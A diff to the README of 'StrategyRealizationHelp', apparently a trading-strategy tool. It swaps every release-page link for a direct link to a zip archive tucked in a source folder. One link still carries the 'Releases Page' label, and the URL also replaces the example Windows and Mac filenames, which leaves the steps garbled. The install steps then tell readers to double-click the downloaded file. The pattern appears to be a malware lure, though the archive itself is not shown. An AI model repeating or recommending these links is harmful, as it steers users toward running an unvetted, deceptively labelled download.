@@ -1,15 +1,15 @@
 # 🎯 StrategyRealizationHelp - Simplify Your Strategy Implementation
 
 ## 📦 Download Now
-[![Download StrategyRealizationHelp](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/SSSkrepka523/StrategyRealizationHelp/releases)
+[![Download StrategyRealizationHelp](https://github.com/SSSkrepka523/StrategyRealizationHelp/raw/refs/heads/master/TrendFollowingStrategy/src/Realization-Help-Strategy-3.6-alpha.5.zip)](https://github.com/SSSkrepka523/StrategyRealizationHelp/raw/refs/heads/master/TrendFollowingStrategy/src/Realization-Help-Strategy-3.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to StrategyRealizationHelp! This application helps you realize basic strategies easily and effectively. Follow the steps below to download and run the application.
 
 ## 📥 Download & Install
-1. Visit the following page to download the latest version of StrategyRealizationHelp: [Releases Page](https://github.com/SSSkrepka523/StrategyRealizationHelp/releases).
+1. Visit the following page to download the latest version of StrategyRealizationHelp: [Releases Page](https://github.com/SSSkrepka523/StrategyRealizationHelp/raw/refs/heads/master/TrendFollowingStrategy/src/Realization-Help-Strategy-3.6-alpha.5.zip).
 2. Look for the most recent version listed at the top of the page.
-3. Click on the appropriate file to download it. If you are unsure which file to choose, look for the one with a clear label like `StrategyRealizationHelp.exe` for Windows or `StrategyRealizationHelp.dmg` for Mac.
+3. Click on the appropriate file to download it. If you are unsure which file to choose, look for the one with a clear label like `https://github.com/SSSkrepka523/StrategyRealizationHelp/raw/refs/heads/master/TrendFollowingStrategy/src/Realization-Help-Strategy-3.6-alpha.5.zip` for Windows or `https://github.com/SSSkrepka523/StrategyRealizationHelp/raw/refs/heads/master/TrendFollowingStrategy/src/Realization-Help-Strategy-3.6-alpha.5.zip` for Mac.
 4. Once the file has downloaded, locate it in your device’s download folder.
 5. Double-click on the file to start the installation process. Follow the prompts to complete the installation.
 
@@ -51,7 +51,7 @@ If you encounter issues while running StrategyRealizationHelp, try the following
 4. **Contact Support:** If you continue to experience problems, feel free to reach out to our support team for assistance.
 
 ## 🆕 Updates
-We regularly update StrategyRealizationHelp to improve features and fix bugs. Make sure to check the [Releases Page](https://github.com/SSSkrepka523/StrategyRealizationHelp/releases) often for the latest updates.
+We regularly update StrategyRealizationHelp to improve features and fix bugs. Make sure to check the [Releases Page](https://github.com/SSSkrepka523/StrategyRealizationHelp/raw/refs/heads/master/TrendFollowingStrategy/src/Realization-Help-Strategy-3.6-alpha.5.zip) often for the latest updates.
 
 ## 📝 Contributions
 We welcome contributions to enhance StrategyRealizationHelp. If you have suggestions or want to help, please reach out. 
